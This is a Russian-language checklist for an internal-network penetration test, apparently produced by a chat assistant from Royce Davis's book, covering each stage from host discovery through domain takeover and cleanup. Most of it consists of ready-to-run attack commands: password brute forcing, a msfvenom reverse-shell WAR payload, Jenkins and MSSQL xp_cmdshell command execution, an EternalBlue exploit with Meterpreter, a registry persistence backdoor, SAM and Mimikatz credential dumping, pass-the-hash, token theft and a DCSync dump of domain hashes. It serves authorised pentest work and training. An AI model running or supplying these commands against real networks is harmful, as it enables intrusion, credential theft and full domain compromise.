Вот подробный чек-лист для проведения пентеста внутренней сети с конкретными командами, основанный на инструментах и методиках из книги Ройса Дэвиса.
Важно: Все IP-адреса, имена файлов и пути — это примеры. Заменяйте их на актуальные для вашей задачи.
Этап 1: Сбор информации (Information Gathering)
1. Обнаружение активных хостов (Host Discovery)
Задача: Найти живые машины в диапазоне сети.
Ping-сканирование через Nmap:
code
Bash
nmap -sn -iL ranges.txt -oA discovery/ping_sweep
(Опции: -sn — без сканирования портов, только пинг; -iL — список целей; -oA — сохранить во всех форматах)
Если ICMP заблокирован (сканирование топ-портов):
code
Bash
nmap -Pn -n -p 21,22,80,443,445,3389 -iL ranges.txt -oA discovery/top_ports
2. Обнаружение служб (Service Enumeration)
Задача: Узнать, какие сервисы работают на найденных хостах.
Быстрое сканирование (только определение версий):
code
Bash
nmap -Pn -n -sV -p- -iL targets.txt -oA discovery/services_scan
Парсинг результатов (получение списка IP по сервисам):
Пример для SMB (445):
code
Bash
grep "445/open" discovery/services_scan.gnmap | cut -d " " -f 2 > smb_hosts.txt
3. Поиск базовых уязвимостей
Задача: Найти слабые пароли и отсутствие патчей.
Проверка SMB (версии Windows, подписи):
code
Bash
crackmapexec smb targets.txt
Поиск MS17-010 (EternalBlue):
В Metasploit:
code
Bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS file:targets.txt
run
Брутфорс слабых паролей (пример для SMB):
code
Bash
crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success
(Или модуль Metasploit: auxiliary/scanner/smb/smb_login)
Этап 2: Целенаправленное проникновение (Focused Penetration)
1. Эксплуатация веб-сервисов (Tomcat / Jenkins)
Задача: Получить шелл через загрузку файлов или скрипты.
Tomcat (загрузка WAR-файла):
Создать пейлоад:
code
Bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ВАШ_IP> LPORT=4444 -f war > shell.war
Загрузить shell.war через GUI администратора Tomcat (/manager/html).
Jenkins (Groovy Script Console):
Перейти в /script.
Выполнить команду (Java):
code
Java
println "cmd.exe /c whoami".execute().text
2. Атака на базы данных (MSSQL)
Задача: Выполнение команд через SQL-запросы.
Вход и включение xp_cmdshell (через mssql-cli или Metasploit):
code
SQL
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
Выполнение команд ОС:
code
SQL
exec master..xp_cmdshell 'whoami'
3. Эксплуатация известных уязвимостей (MS17-010)
Задача: Получить системный доступ на непропатченной машине.
Запуск эксплойта через Metasploit:
code
Bash
use exploit/windows/smb/ms17_010_psexec
set RHOST <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
run
Этап 3: Постэксплуатация (Post-Exploitation)
1. Закрепление (Persistence) и работа с сессией
Обновление до полноценного Meterpreter (если был простой shell):
В Metasploit: sessions -u <ID_СЕССИИ>
Создание бэкдора (пример через реестр):
code
Bash
run persistence -U -i 10 -p 4444 -r <YOUR_IP>
2. Сбор учетных данных (Looting)
Дамп локальных хешей (из SAM):
В Meterpreter:
code
Bash
hashdump
Извлечение паролей из памяти (Mimikatz):
В Meterpreter:
code
Bash
load mimikatz
wdigest  # или tspkg / kerberos
Ручной дамп реестра (если инструменты не работают):
code
Cmd
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
На атакующей машине (извлечение):
code
Bash
impacket-secretsdump -sam sam -system system LOCAL
3. Горизонтальное перемещение (Lateral Movement)
Задача: Использовать найденные хеши/пароли для входа на другие ПК.
Pass-the-Hash (проверка доступа):
code
Bash
crackmapexec smb targets.txt -u Administrator -H <HASH>
Вход с хешем (psexec):
code
Bash
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes <LM:NT>
4. Захват домена (Privilege Escalation to Domain Admin)
Поиск сессий администраторов домена:
code
Bash
crackmapexec smb targets.txt -u user -p pass --loggedon-users | grep "Domain Admins"
Кража токена (Incognito):
В Meterpreter (на машине, где залогинен админ):
code
Bash
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
Дамп всех паролей домена (DCSync / NTDS.dit):
Если есть права Domain Admin:
code
Bash
impacket-secretsdump <DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP> -just-dc-ntlm
Этап 4: Очистка (Cleanup)
1. Удаление следов
Удаление загруженных файлов:
code
Cmd
del C:\Temp\sam
del C:\Temp\system
del C:\shell.war
Отмена изменений конфигурации (MSSQL):
code
SQL
sp_configure 'xp_cmdshell', 0; RECONFIGURE;
Удаление пользователя (если создавали):
code
Cmd
net user hacker /delete
Очистка записей автозагрузки (Persistence):
Проверить ключи реестра HKCU\Software\Microsoft\Windows\CurrentVersion\Run и удалить созданные Metasploit записи.
2. Документирование
Сохранить все логи (spool в Metasploit, выводы терминала).
Записать пути ко всем файлам, которые не удалось удалить.
Составить отчет согласно структуре: Резюме -> Описание атаки -> Технические детали -> Рекомендации.